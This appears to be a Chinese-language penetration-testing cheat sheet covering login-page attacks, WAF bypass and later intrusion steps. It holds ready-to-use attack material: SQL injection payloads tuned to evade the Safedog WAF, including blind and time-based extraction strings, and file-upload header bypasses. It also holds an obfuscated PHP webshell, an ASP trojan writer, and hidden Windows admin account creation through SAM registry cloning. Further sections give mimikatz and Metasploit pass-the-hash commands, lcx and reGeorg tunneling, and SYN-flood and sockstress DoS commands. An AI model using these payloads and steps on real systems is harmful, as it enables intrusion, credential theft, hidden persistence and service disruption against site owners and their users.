<h2 id="其他漏洞总结"><a href="#其他漏洞总结" class="headerlink" title="其他漏洞总结"></a>其他漏洞总结</h2><p>如果获得登录页面，但是没有账号密码，应该怎样破解？<br>1.暴力破解<br>2.扫敏感目录及文件<br>3.报错的页面图片也存在XSS漏洞<br>4.隐藏域中存在明文密码。（明文密码存在于当前页面的源码中）<br>5.逻辑漏洞-任意密码重置<br>6.短信炸弹<br>7.SVN源码泄露<br>8.扫描局域网共享<br>9.HTTP响应拆分漏洞<br>10.发掘隐藏的连接地址，例如登录页面中，有个帮助连接，或者相关软件等连接，也可以进行测试<br>11.IIS短文件名漏洞<br>12.JQuery1.7版本一下存在XSS漏洞<br>13.目录浏览漏洞<br>14.URL跳转漏洞<br>15.框架钓鱼漏洞<br>16.未加密登录请求<br>17.HTTP报头追踪漏洞<br>18.DNS域传送漏洞<br>19.私有ip泄露<br>20.网络物理路径信息泄露漏洞<br>21.系统重装漏洞<br>22.任意文件下载  </p>
<h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><p><strong>漏洞扫描</strong>使用AWVS ，Nessus，Xray(推荐)。<br><strong>万能密码绕过</strong>。例如’or 1=1 –-    “or “a”=”a<br><strong>弱口令爆破</strong>：弱口令爆破工具推荐,详情可看以下，不在赘述：<br><strong>Hydra</strong>：<a href="https://yq.aliyun.com/articles/608406/" target="_blank" rel="noopener">https://yq.aliyun.com/articles/608406/</a><br><strong>超级弱口令</strong>：链接：<a href="https://pan.baidu.com/s/1mkwnxu19Aq-KEVCWOZn99w" target="_blank" rel="noopener">https://pan.baidu.com/s/1mkwnxu19Aq-KEVCWOZn99w</a> 提取码：blj3<br><strong>御剑RDP爆破</strong>: <a href="https://github.com/foryujian/yujianrdpcrack" target="_blank" rel="noopener">https://github.com/foryujian/yujianrdpcrack</a><br><strong>Bruter:</strong> <a href="https://www.uedbox.com/post/8478/" target="_blank" rel="noopener">https://www.uedbox.com/post/8478/</a><br><strong>定制化生成字典：</strong> <a href="http://tools.mayter.cn/" target="_blank" rel="noopener">http://tools.mayter.cn/</a><br><strong>字典：</strong> <a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">https://github.com/rootphantomer/Blasting_dictionary</a><br><strong>目录扫描</strong><br><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a> ,DirSearch可以多级别扫描，在枚举子目录的目录，很多时候可以找到突破口。<br>御剑：<a href="https://github.com/52stu/-" target="_blank" rel="noopener">https://github.com/52stu/-</a> 也是比较常用的<br><strong>JS扫描</strong><br>JS文件我们在渗透测试中也是经常用到的东西，例如重置密码的JS，发送短信的JS，都是有可能未授权可访问的。JS扫描的话推荐使用JSFind: <a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">https://github.com/Threezh1/JSFinder</a><br><strong>nmap扫描</strong>  </p>
<h2 id="渗透测试报告"><a href="#渗透测试报告" class="headerlink" title="渗透测试报告"></a>渗透测试报告</h2><p>使用模板</p>
<h2 id="源代码审计"><a href="#源代码审计" class="headerlink" title="源代码审计"></a>源代码审计</h2><p>略</p>
<h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>英文：web applacation firwall<br>waf工作在第五层，属于应用层防火墙，传统的防火墙是在第三层工作的，实现网络层的防御。<br>云waf是将真实的ip地址隐藏，使攻击者找不到真正的ip地址<br>绕过方法：以<a href="http://www.oldboyedu.com为例，ping通之后不是真正的ip地址，需要寻找到真正的ip地址，在浏览器中输入dljlf.oldboyedu.com也能访问网站，说明该网站使用了泛地址，即与网站相似的域名都可以进行访问该网站，此时ping" target="_blank" rel="noopener">www.oldboyedu.com为例，ping通之后不是真正的ip地址，需要寻找到真正的ip地址，在浏览器中输入dljlf.oldboyedu.com也能访问网站，说明该网站使用了泛地址，即与网站相似的域名都可以进行访问该网站，此时ping</a> dljlf.oldboyedu.com 后可以看到真正的ip地址。</p>
<h3 id="waf身份验证绕过"><a href="#waf身份验证绕过" class="headerlink" title="waf身份验证绕过"></a>waf身份验证绕过</h3><p><strong>方法一</strong>绕过方法一：伪造搜索引擎<br>老版本的WAF是有这个漏洞的，就是把User-Agent修改为搜索引擎（例如百度），便可以绕过，进行sql注入等攻击, 这里推荐一个火狐插件，可以修改User-Agent，叫User-Agent Switcher 下载地址: <a href="https://addons.mozilla.org/zh-CN/firefox/addon/user-agent-switcher/安装完后重启Firefox浏览器" target="_blank" rel="noopener">https://addons.mozilla.org/zh-CN/firefox/addon/user-agent-switcher/安装完后重启Firefox浏览器</a>, 打开User Agent Switcher设置面板点击你要添加的分组然后点击New User Agent输入User Agent信息然后点击确定<br>也可以使用burpsuit修改USER-Agent:抓包之后将user-agent改为baiduspider即可绕过。同时在burpsuit中进行批量替换<br><strong>方法二</strong>伪造白名单特殊目录  参考<a href="http://www.wooyun.org/bugs/wooyun-2014-050576" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2014-050576</a><br><strong>方法三</strong>直接攻击源站，寻找到源站进行攻击。  </p>
<h3 id="waf数据包解析的绕过"><a href="#waf数据包解析的绕过" class="headerlink" title="waf数据包解析的绕过"></a>waf数据包解析的绕过</h3><p>1.<strong>编码绕过</strong>：将访问数据库的语句进行url编码，生成url编码后进行访问，waf可能识别不出来。（但是现在这种方法不好用）<br>2.<strong>修改请求方式绕过</strong><br>：例如waf通常会检测get方式提交的代码，但是一般不会检测cookie和post提交的代码，所以将get方式改为post方式即可。<br>3.<strong>复参数绕过</strong><br>例如一个请求是这样的<br>GET /pen/news.php?id=1 union select user,password from mysql.user不能通过检测<br>可以修改为<br>GET pen/news.php?id=1&amp;id=union&amp;id=select&amp;id=user,password&amp;id=from%20mysql.user。计算机会将语句自动进行拼接整理，很多WAF都可以这样绕，测试最新版WAF能绕过部分语句<br>4.<strong>WAF触发规则的绕过</strong><br>WAF主要是针对一些特殊的关键词或者用法进行检测。绕过方法很多，也是最有效的。<br>绕过策略一：特殊字符替换空格<br>用一些特殊字符代替空格，比如在mysql中<strong>%0a</strong>是换行，可以代替空格，这个方法也可以部分绕过最新版本的WAF，在sqlserver中可以用<code>/**/</code>代替空格，也可以使用如下方法：<br><a href="http://192.168.0.142:8080/sql.php?id=1/*|%23--%23|*/union/*|%23--%23|*/select/*|%23--%23|*/1,user(),3,4,5" target="_blank" rel="noopener">http://192.168.0.142:8080/sql.php?id=1/*|%23--%23|*/union/*|%23--%23|*/select/*|%23--%23|*/1,user(),3,4,5</a><br><a href="http://192.168.0.142:8080/sql.php?id=1/*|%23--%23|*/and/*|%23--%23|*/1=2" target="_blank" rel="noopener">http://192.168.0.142:8080/sql.php?id=1/*|%23--%23|*/and/*|%23--%23|*/1=2</a><br>绕过策略二：特殊字符拼接<br>把特殊字符拼接起来绕过WAF的检测，比如在Mysql中，可以利用注释/<strong>/来绕过，在mssql中，函数里面可以用+来拼接<br>如：GET /pen/news.php?id=1;exec(master..xp_cmdshell ‘net user’)<br>可以改为：GET /pen/news.php?id=1; exec(‘maste’+’r..xp’+’_cmdshell’+’”net user”‘)<br>绕过策略三：注释包含关键字<br>在mysql中，可以利用/<em>!</em>/包含关键词进行绕过，在mysql中这个不是注释，</strong>而是取消注释的内容<strong>。测试最新版本的WAF可以完美绕过。<br>如: GET /pen/news.php?id=1 union select user,password from mysql.user<br>可以改为: GET /pen/news.php?id=1 /<em>!union</em>/ /<em>!select</em>/  user,password /<em>!from</em>/ mysql.user<br>绕过策略四：<br>也可以尝试seelct~ select~1 select! select@等绕过成功<br>5空格替换法<br>把空格替换成`%0a /</strong>/<code>可以绕过最新版本WAF, 在Pangolin中 点击 编辑-- 配置-- 高级-- 选择替换空格使用-- 填上</code>%0a/<strong>/<code>即可
http://192.168.0.142:8080/sql.php?id=1%20union%23%0aselect%23%0a1,user(),3,4,5  
6.使用大小写</code><a href="http://www" target="_blank" rel="noopener">http://www</a>.*</strong>.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4….<code>7.关键字替换</code><a href="http://www.***.com/index.php?page_id=-15" target="_blank" rel="noopener">http://www.***.com/index.php?page_id=-15</a> UNIunionON SELselectECT 1,2,3,4….<code>此方法适用于一些会把union select替换掉的WAF，经过WAF过滤后就会变成 union select 1,2,3,4....  
8.编码与注释结合</code><a href="http://www.***.com/index.php?page_id=-15" target="_blank" rel="noopener">http://www.***.com/index.php?page_id=-15</a> %55nION/**/%53ElecT 1,2,3,4…`</p>
<pre><code>http://192.168.0.142:8080/sql.php?id=1/*!50000*/union/*!50000*/select/*!50000*/1,user(),3,4,5</code></pre><p>也可以这样<br><code>http://192.11.22.55/sqli/Less-1/?id=1&#39; and /*!1=1*/ %23</code> (WAF不拦截)<br>      U替换为%55，S替换为%53 在 union 和 select 之间添加注释/**/<br>手工进行加注释进行注入太慢，一般我们通过Sqlmap这类工具来实现自动注入:</p>
<pre><code>sqlmap.py -u &quot;URL&quot; --tamper=&quot;versionedmorekeywords.py&quot; --dealy=1</code></pre><p>9.利用WAF本身的功能绕过<br> 假如你发现WAF会把”*”替换为空，那么你就可以利用这一特性来进行绕过<br>‍‍‍<a href="http://www.site.com/index.php?page_id=-15+uni*on+sel*ect+1,2,3,4" target="_blank" rel="noopener">http://www.site.com/index.php?page_id=-15+uni*on+sel*ect+1,2,3,4</a>….<br>其它方法-15+(uNioN)+(sElECt)….-15+(uNioN+SeleCT)+…-15+(UnI)(oN)+(SeL)(ecT)+….-15+union (select 1,2,3,4…)<br>10.使用其他变量或者命令对注入语句进行替换</p>
<blockquote>
<pre><code>COMMAND | WHAT TO USE INSTEAD
@@version | version()
concat() | concat_ws()
group_concat() | concat_ws()
= | like</code></pre></blockquote>
<p>11.组合绕过waf<br>先判断注入点，把and为&amp;&amp;,url编码后为%26%26<br><a href="http://192.168.0.102:8080/sql.php?id=1%20%26%26%20-1=-2" target="_blank" rel="noopener">http://192.168.0.102:8080/sql.php?id=1%20%26%26%20-1=-2</a><br><strong>下面我们具体讲解绕过方法：</strong><br>1.利用()代替空格<br>2.利用mysql特性/<em>!</em>/执行语句<br>3.利用/<strong>/混淆代码<br>我给出的注入语句是：<br>    `union/<em>%00</em>//<em>!50010select</em>/(database/</strong>/()),(user/<strong>/())%23<code></code>id=1/<em>|%23–%23|</em>/unioN/<em>|%23–%23|</em>/sElect/<em>|%23–%23|</em>/1,user(),(database/</strong>/()),4,5<code>http://192.168.0.102:8080/sql.php?id=1 union/*%00*//*!50010select*/1,user(),version(),4,5
这里要注意的几点是：  
1.mysql关键字中是不能插入</code>/<strong>/<code>的，即</code>se/</strong>/lect<code>是会报错的，但是函数名和括号之间是可以加上</code>/<strong>/<code>的,像</code>database/</strong>/()`这样的代码是可以执行的<br>2./<em>!</em>/中间的代码是可以执行的，其中50010为mysql版本号，只要mysql大于这个版本就会执行里面的代码<br>3.数据或者函数周围可以无限嵌套()<br>4.利用好%00<br>完整过狗注入语句<br>判断： 1’/**/%26%261%3d2%23<br>判断列数： 1’ order by 2%23  </p>
<p>关联查询爆出用户和数据库：<code>1%27%20union/*%00*//*!50010select*/(database/**/()),(user/**/())%23</code><br>关联查询爆出数据表： <code>%27%20union/*%00*//*!50010select*/((group_concat(table_name))),null/**/from/**/((information_schema.TABLES))/**/where/**/TABLE_SCHEMA%3d(database/**/())%23</code><br>关联查询爆出字段值： <code>%27%20union/*%00*//*!50010select*/((group_concat(COLUMN_NAME))),null/**/from/**/((information_schema.columns))/**/where/**/TABLE_NAME%3d%27users%27%23</code><br>关联查询提取数据： <code>%27%20union/*%00*//*!50010select*/((group_concat(first_name))),null/**/from/**/((users))%23</code><br>盲注爆出数据库：<code>1&#39; and substr(database/**/(),1,1)%3d&#39;1&#39;%23</code><br>盲注爆出数据表： <code>1&#39;/*%00*/and substr((/*!50010select*/((group_concat(table_name)))/**/from/**/((information_schema.TABLES))/**/where/**/TABLE_SCHEMA%3d(database/**/())),1,1)%3d&#39;1&#39;%23</code><br>盲注爆出字段值： <code>1&#39;/*%00*/and substr((/*!50010select*/((group_concat(COLUMN_NAME)))/**/from/**/((information_schema.columns))/**/where/**/TABLE_NAME%3d%27users%27),1,1)%3d&#39;1&#39;%23</code><br>盲注提取数据： <code>1&#39;/*%00*/and substr((/*!50010select*/((group_concat(first_name)))/**/from/**/((users))),1,1)%3d&#39;1&#39;%23</code><br>基于时间的盲注爆出数据库： </p>
<blockquote>
<p>1’/<em>%00</em>/and (select case when (substr(database/<strong>/(),1,1) like ‘d’) then sleep/</strong>/(3) else 0 end)%23  </p>
</blockquote>
<p>基于时间的盲注爆出数据表： <code>1&#39;/*%00*/and (select case when (substr((/*!50010select*/((group_concat(table_name)))/**/from/**/((information_schema.TABLES))/**/where/**/TABLE_SCHEMA%3d(database/**/())),1,1) like &#39;d&#39;) then sleep/**/(3) else 0 end)%23</code><br>基于时间的盲注爆出字段值： <code>1&#39;/*%00*/and (select case when (substr((/*!50010select*/((group_concat(COLUMN_NAME)))/**/from/**/((information_schema.columns))/**/where/**/TABLE_NAME%3d%27users%27),1,1) like &#39;d&#39;) then sleep/**/(3) else 0 end)%23</code><br>基于时间的盲注提取数据： <code>1&#39;/*%00*/and (select case when (substr((/*!50010select*/((group_concat(first_name)))/**/from/**/((users))),1,1) like &#39;d&#39;) then sleep/**/(3) else 0 end)%23</code></p>
<p>也可以通过以下方法绕过<br>Union -&gt; /<em>!Union/</em>/<strong>/<br>Select -&gt; /<em>!/</em>!Select<em>/<br>Database() -&gt; /</em>!database/*/</strong>//<em>!/</em>!()*/<br>使用这种方法SQL语句依然可以正确执行，而且会完美过狗！<br>但是这里比较坑的一点是安全狗3.5版本会拦截关键字information_schema，这样利用起来就比较麻烦了，不过私神还是提供了一种方法绕过：<br>当mysql版本&gt;=5.6时，可以用如下语句代替：<br>Select table_name from mysql.innodb_table_stats where database_name = database();  </p>
<h3 id="waf文件上传漏洞"><a href="#waf文件上传漏洞" class="headerlink" title="waf文件上传漏洞"></a>waf文件上传漏洞</h3><p>1.突破0，文件名前缀加[0x09]绕过：<code>Content-Disposition: form-data; name=”filepath”; filename=”[0x09]backlion.asp”</code><br>2.突破1，文件名去掉双引号绕过：<code>Content-Disposition: form-data; name=”filepath”; filename=backlion.asp</code><br>3.突破2，添加一个filename1的文件名参数，并赋值绕过：<code>Content-Disposition: form-data; name=”filepath”; filename=”backlion.asp”;filename1=”test.jpg”</code><br>4.突破3， form变量改成f+orm组合绕过：<code>Content-Disposition: f+orm-data; name=”filepath”;filename=”backlion.asp”</code><br>5.突破4 ，文件名后缀大小写绕过：<code>ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.Asp”</code><br>6.突破5 ，去掉form-data变量绕过：<code>ConTent-Disposition: name=”filepath”; filename=”backlion.asp”</code><br>7.突破6，在Content-Disposition:后添加多个空格 或者在form-data;后添加多个空格绕过：    <code>ConTent-Disposition: form-data ; name=”filepath”; filename=”backlion.asp”</code><br>8.<code>ConTentDisposition: form-data ; name=”filepath”; filename=”baclion.asp”</code><br>9.突破7 ，backlion.asp . (空格+.)绕过：<code>ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp .”</code><br>10.突破8 ，“回车换行，绕过：   <code>ConTent-Disposition: form-data; name=”filepath”; filename</code><br>    <code>=”backlion.asp”</code><br>11.突破9 ，NTFS流 在文件名后加::$DATA绕过：<code>ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp::$DATA”</code><br>12.<code>ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp::$DATA\0x00\fuck.asp0x00.jpg”</code><br>13.突破10， 经过对IIS 6.0的测试发现，其总是采用第一个（也就是双文件上传）Content-Disposition中的值做为接收参数，而安全狗总是以最后一个Content-Disposition中的值做为接收参数。因此尝试构造如下请求[上传backlion.asp成功]：</p>
<pre><code>&gt; Content-Disposition: form-data; name=”FileUploadName”; filename=”backlion.asp”
&gt; —————————–15377259221471
&gt; Content-Disposition: form-data; name=”FileUploadName”; filename=”backlion.txt”
&gt; Content-Type: application/octet-stream
&gt; Content-Disposition: form-data; name=”FileUploadName”; filename=”backlion.asp”
&gt; Content-Disposition: form-data;
&gt; name=”FileUploadName”; filename=”backlion.asp”  </code></pre><p>14.突破11，将Content-Type和ConTent-Disposition调换顺序位置绕过：  </p>
<pre><code>&gt; Content-Type: text/html
&gt; ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp”</code></pre><p>15.突破12，在文件名前缀加空格（tab键可替换）绕过：<code>Content-Disposition: form-data; name=”filepath”; filename=    “backlion.asp”</code><br>16.突破13，在form-data加空格绕过：<code>Content-Disposition: form-data;      name=”uploaded”; filename=”backlion.asp”</code><br>17.突破14，在form-data的前后加上+绕过：<code>Content-Disposition: +form-data; name=”filepath”; filename=”backlion.asp”</code><br>18.<code>Content-Disposition: form-data+; name=”filepath”; filename=”backlion.asp”</code>  </p>
<h3 id="Waf木马检测绕过"><a href="#Waf木马检测绕过" class="headerlink" title="Waf木马检测绕过"></a>Waf木马检测绕过</h3><p>对于使用php写的木马，waf安全狗通常是去检测php文件中是否含有一些敏感的函数，如果有则进行截杀。所以我们写php木马的时候需要巧妙构造php代码，进而绕过安全狗。 </p>
<pre><code>&gt; &lt;?php 
&gt; $mt=&quot;JF9QT1N&quot;; //文件路径
&gt; $ojj=&quot;QGV2YWwo&quot;;//文件路径
&gt; $hsa=&quot;UWydpMGle&quot;;//文件路径
&gt; $fnx=&quot;5BeSleleddKTs=&quot;;//文件路径
&gt; $zk = str_replace(&quot;d&quot;,&quot;&quot;,&quot;sdtdrd_redpdldadcde&quot;); //用空替换为后面变量的所有d字母，替换后为$zk=str_replace。
&gt; $ef = $zk(&quot;z&quot;, &quot;&quot;, &quot;zbazsze64_zdzeczodze&quot;); //同理，$ef=base64_decode;
&gt; $dva = $zk(&quot;p&quot;,&quot;&quot;,&quot;pcprpepaptpe_fpupnpcptpipopn&quot;); //同理,$dva=create_function;
&gt; $zvm = $dva(&#39;&#39;, $ef($zk(&quot;le&quot;, &quot;&quot;, $ojj.$mt.$hsa.$fnx))); //$zvm=create_function(&#39;&#39;,base64_decode(strplace(...)));
&gt; $zvm(); //执行zvm函数。
&gt; ?&gt;
&gt; &lt;?</code></pre><h3 id="一句话木马编写"><a href="#一句话木马编写" class="headerlink" title="一句话木马编写"></a>一句话木马编写</h3><pre><code>客户端：  
&lt;form action=http://192.168.0.2/2.asp method=post&gt;//&quot;action=&quot;后面是需要修改的以asp命名的数据库的提交地址,
&lt;textarea name=value cols=120 rows=10 width=45//这里的value值根据服务端&lt;%execute request(&quot;value&quot;)%&gt;中value而设定,可以自行修改成&lt;%execute request(&quot;p&quot;)%&gt;相应这里的value值也必须改为p
set lP=server.CreateObject(&quot;Adodb.Stream&quot;) //建立流对象，有了对象才可以使用它固有的属性和方法 
lP.Open //建立流对象，有了对象才可以使用它固有的属性和方法 
lP.Type=2 //以文本方式
lP.CharSet=&quot;gb2312&quot; //字体标准
lP.writetext request(&quot;p&quot;) //取得木马内容 参数joeving可以自己定义 但必须和下面的name=joeving相对应
lP.SaveToFile server.mappath(&quot;ok.asp&quot;),2 //将木马内容以覆盖文件的方式写入ok.asp，2就是已覆盖的方式，这里的ok.asp也是可以自己定义的，如定义成1.asp，但和下面的response.redirect&quot;ok.asp&quot;中ok.asp的保持一致
lP.Close //释放对象
set lP=nothing 
response.redirect &quot;ok.asp&quot;  //转向生成的ok.asp 和上面的ok.asp相对应，也就是你熟悉的asp木马登 陆界面
&lt;/textarea
&lt;textarea name=p cols=120 rows=10 width=45&gt;这填马的代码&lt;/textarea&gt;&lt;BR&gt;&lt;center&gt;&lt;br
&lt;input type=submit value=提交&gt;
&lt;/textarea&gt;
服务端：
 &quot;&lt;%execute request(&quot;l&quot;)%&gt;
//这段程序的功能：利用插入到数据库文件的&lt;%execute request(&quot;value&quot;)%&gt;这段代码执行第一个textarea中的内容，并将添加的木马内容写入和指向ok.asp，这样就相当于在服务器上建立了个ok.asp木马文件，这样就可以取得webshell了</code></pre><h3 id="使用waf创建账号"><a href="#使用waf创建账号" class="headerlink" title="使用waf创建账号"></a>使用waf创建账号</h3><p>二、建立隐藏帐号</p>
<p>1、CMD命令行下，建立一个用户名为“test$”，密码为“abc123!”的简单隐藏账户,并且把该隐藏账户提升为了管理员权限。<br>PS:CMD命令行使用”net user”,看不到”test$”这个账号，因为后面加了一个$符号，所以使用cmd是查看不了的。但是在控制面板和本地用户和组是可以查看的。为了防止管理员能够查看到，解决方法如下：<br>2、“开始”→“运行”，输入“regedt32.exe”后回车,需要到“HKEY_LOCAL_MACHINE\SAM\SAM”，单机右建权限，把名叫：administrator的用户给予：完全控制以及读取的权限，在后面打勾就行，然后关闭注册表编辑器，再次打开即可。<br>3、来到注册表编辑器的“HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names”处，点击test$用户，得到在右边显示的键值中的“类型”一项显示为0x3ec，找到箭头所指目录。<br>4、找到administrator所对应的的项为“000001F4”，将“000001F4”的F值复制到“000003EC”的F值中，保存。<br>5、分别test$和“000003EC导出到桌面，删除test$用户   net user test$ /del  （以上操作可以在攻击者自己的电脑上导出创建账号的文件）<br>6、将刚才导出的两个后缀为.reg的注册表项导入注册表中（点击）。这样所谓的隐藏账户就创建好了。这样创建的账号只能在注册表中可以查看，通过cmd命令或者用户分组是查看不了的。<br>使用D盾_web查杀工具，使用克隆账号检测功能进行查看，可检测出隐藏、克隆账号，如果查不出来，可以克隆中间件帐号  </p>
<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，其命名可能和正常的文件命名很类似，让人无法第一眼通过文件名判断其为后门文件。然后攻击者就可以<strong>使用浏览器来访问</strong>asp或者php后门，也可以使用连接工具进行访问(例如中国菜刀)得到一个命令执行环境，在该环境中可以进行操作服务器等各种攻击，包括上传下载文件、查看数据库、执行任意程序命令等一系列操作。<br>小马：只包含文件上传功能<br>大马：包含的功能更加全面<br>一句话木马：一般只是一句话。<br>拿webshall方法：<br>1.cms获取webshell，cms是一种网站搭建模板，可以方便的搭建一个网站，在谷歌浏览器中使用wappalyzer查看网站的cms，然后根据cms版本查询百度获取该cms的方法。<br>2.非cms获取webshell，表示该公司网站是自己写的，不是使用的模板。<br>1）数据库备份获取webshell，在打开数据库文件，插入一句话木马，然后进行备份即可获取webshell进行连接。<br>2）抓包上传获取webshell<br>3）sql命令获取webshell，可以执行Select ‘<? php eval($_POST[pass]);?>‘ into outfile ‘c:/wwwtest/eval.php’这条命令，表示查询<? php eval($_POST[pass]);?>，将该语句写入到eval.php文件然后将该文件保存到路径下，后面即可进行连接。<br>4）模块修改获取webshell，在后台模块中直接新建木马文件，进行连接。<br>5）插入一句话获取webshell<br>6）修改上传类型获取webshell<br>参考：<a href="http://gstarwd.iteye.com/blog/542376" target="_blank" rel="noopener">http://gstarwd.iteye.com/blog/542376</a><br><a href="http://www.t00ts.net/post-121.html" target="_blank" rel="noopener">http://www.t00ts.net/post-121.html</a><br><a href="http://www.2cto.com/Article/201306/221832.html" target="_blank" rel="noopener">http://www.2cto.com/Article/201306/221832.html</a> 中间件拿Webshell方法总结</p>
<h2 id="常见提权方法"><a href="#常见提权方法" class="headerlink" title="常见提权方法"></a>常见提权方法</h2><p>如果拿到webshell之后发现不能执行cmd命令，原因是因为管理员对cmd进行了防御，此时我们使用中国菜刀上传一个cmd文件即可。<br><strong>获取管理员密码</strong><br>1.使用mimikatz工具获取管理员密码，第一条：privilege::debug  //提升权限 第二条：sekurlsa::logonpa<br>ssWords  //抓取密码<br>2.如果获取到的是hash加密的密码：利用Hash远程登录系统，主要通过MSF提供的exploit/windows/smb/psexec<br>模块来完成。</p>
<pre><code>&gt; msf &gt;use exploit/windows/smb/psexec //使用该漏洞
&gt; msf &gt;set RHOST 192.168.1.109//设置主机
&gt; msf &gt;set SMBUser administrator//设置登录账户
&gt; msf &gt;set SMBPass 44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4//设置登录密码，改密码是破解出来的密码，但是是加密的，可是直接使用加密密码登录。
&gt; msf &gt;exploit//攻击
&gt; msf &gt;shell//提权</code></pre><p><strong>获取mysql账号密码</strong><br>1.查看conn,config,data,common,inc等配置文件<br>2.查看mysql文件，/data/mysql/user.myd和user.myi<br>3.通过暴力破解hscan，bruter，hydra，脚本木马等。（这种方法需要数据库可以远程连接，否则不可用）</p>
<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>工具:mysql综合利用工具pax.mac<br>寻址地址：C:/php/MySQL-5.1.50/lib/plugin/udf.dll  </p>
<h3 id="公网到内网攻击"><a href="#公网到内网攻击" class="headerlink" title="公网到内网攻击"></a>公网到内网攻击</h3><p>服务器处于内网，通过lcx.exe进行攻击。在获取到webshell之后，找到lcx路径下执行lcx.exe-slave + 攻击者公网ip+2222+127.0.0.1+3389表示将自己的3389端口映射到公网的2222端口上（让内网来连接攻击者），其中127.0.0.1是因为此时webshell处于服务器中，它执行本地就是执行被攻击者的电脑。<br>在攻击者电脑中执行lcx.exe-listen 2222 4444将监听2222端口的流量转发到4444端口。<br>然后使用远程连接输入127.0.0.1：4444即可进行远程连接服务器。  </p>
<h3 id="内网到内网攻击"><a href="#内网到内网攻击" class="headerlink" title="内网到内网攻击"></a>内网到内网攻击</h3><p>使用reduhGUI工具<br>原理：获取到webshell之后，将reduh下的webshell上传到服务器，用的jsp环境就上传jsp文件，用的php环境就上传php文件，redun和lcx类似都是将内网端口映射到本机，不同的是reduh不需要本地ip具有外网ip<br>参考<a href="http://www.redicecn.com/html/wangluoanquan/20110612/307.html" target="_blank" rel="noopener">http://www.redicecn.com/html/wangluoanquan/20110612/307.html</a><br>另一种工具regeorg+proxifier这两种工具的作用结果与reduh相同。将对应的webshell上传到服务器，执行脚本reGeorgSocksProxy.py -p 9999 -u <a href="http://192.168.80.139/zvuldrill/tunnel.nosocket.php。设置代理" target="_blank" rel="noopener">http://192.168.80.139/zvuldrill/tunnel.nosocket.php。设置代理</a><br>参考<a href="https://www.fujieace.com/penetration-test/regeorg-proxifier.html教程" target="_blank" rel="noopener">https://www.fujieace.com/penetration-test/regeorg-proxifier.html教程</a>  </p>
<h2 id="第三方提权"><a href="#第三方提权" class="headerlink" title="第三方提权"></a>第三方提权</h2><h3 id="server-u提权"><a href="#server-u提权" class="headerlink" title="server-u提权"></a>server-u提权</h3><p><a href="https://blog.csdn.net/God_XiangYu/article/details/99692269" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99692269</a>  </p>
<h3 id="FlashFXP提权"><a href="#FlashFXP提权" class="headerlink" title="FlashFXP提权"></a>FlashFXP提权</h3><p>注意如果密码显示型号，我们可以使用星号密码采摘器进行破解。</p>
<h3 id="gene6FTP提权"><a href="#gene6FTP提权" class="headerlink" title="gene6FTP提权"></a>gene6FTP提权</h3><h3 id="VNC提权"><a href="#VNC提权" class="headerlink" title="VNC提权"></a>VNC提权</h3><h3 id="radmin提权"><a href="#radmin提权" class="headerlink" title="radmin提权"></a>radmin提权</h3><h3 id="zend提权"><a href="#zend提权" class="headerlink" title="zend提权"></a>zend提权</h3><h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><h3 id="windows空格，服务漏洞提权"><a href="#windows空格，服务漏洞提权" class="headerlink" title="windows空格，服务漏洞提权"></a>windows空格，服务漏洞提权</h3><h3 id="perl与cals提权"><a href="#perl与cals提权" class="headerlink" title="perl与cals提权"></a>perl与cals提权</h3><h2 id="DoS攻击"><a href="#DoS攻击" class="headerlink" title="DoS攻击"></a>DoS攻击</h2><p>DoS 不是DOS，全拼：Denial of Service，拒绝服务攻击，原理，在进行三次握手过程中，攻击者发送数据包，接收者回发数据包，此时结束了，攻击者不再发送数据包，导致接收者一直在等待确认包，在这个过程中，攻击者不断发送请求包，导致网络拥堵完成攻击。<br>使用kali发起攻击：脚本：syn-flood.py<br>执行python syn-flood.py 192.168.0.45 3389 命令进行攻击。此时执行该命令是无法完成该攻击的，因为每次攻击机进行访问的时候，被攻击者会自动执行rst拒绝访问，因此需要再攻击上执行-iptables -A OUTPUT -p tcp –tcp-flags RST RST -d 192.168.0.45 -j DROP这个命令，去关闭rst拒绝服务。<br>在windows中使用FastSend工具进行DDoS攻击  </p>
<h3 id="Ip地址欺骗"><a href="#Ip地址欺骗" class="headerlink" title="Ip地址欺骗"></a>Ip地址欺骗</h3><p>已经过时，路由器直接过滤掉假的ip地址，不让其发送数据包。  </p>
<h3 id="smurf攻击"><a href="#smurf攻击" class="headerlink" title="smurf攻击"></a>smurf攻击</h3><p>已经过时</p>
<h3 id="socketStress攻击"><a href="#socketStress攻击" class="headerlink" title="socketStress攻击"></a>socketStress攻击</h3><p>消耗被攻击目标系统资源 -与攻击目标建立大量socket链接<br>-完成三次握手，最后的ACK包window大小为0 (客户端不接收数据) -攻击者资源消耗小（CPU、内存、带宽）<br>-异步攻击，单机可拒绝服务高配资源服务器<br>攻击脚本sicjstress.py<br>攻击命令 sockstress 192.168.0.45:80 eth0或者sockstress 192.168.0.45:80 eth0 -p payloads/http</p>
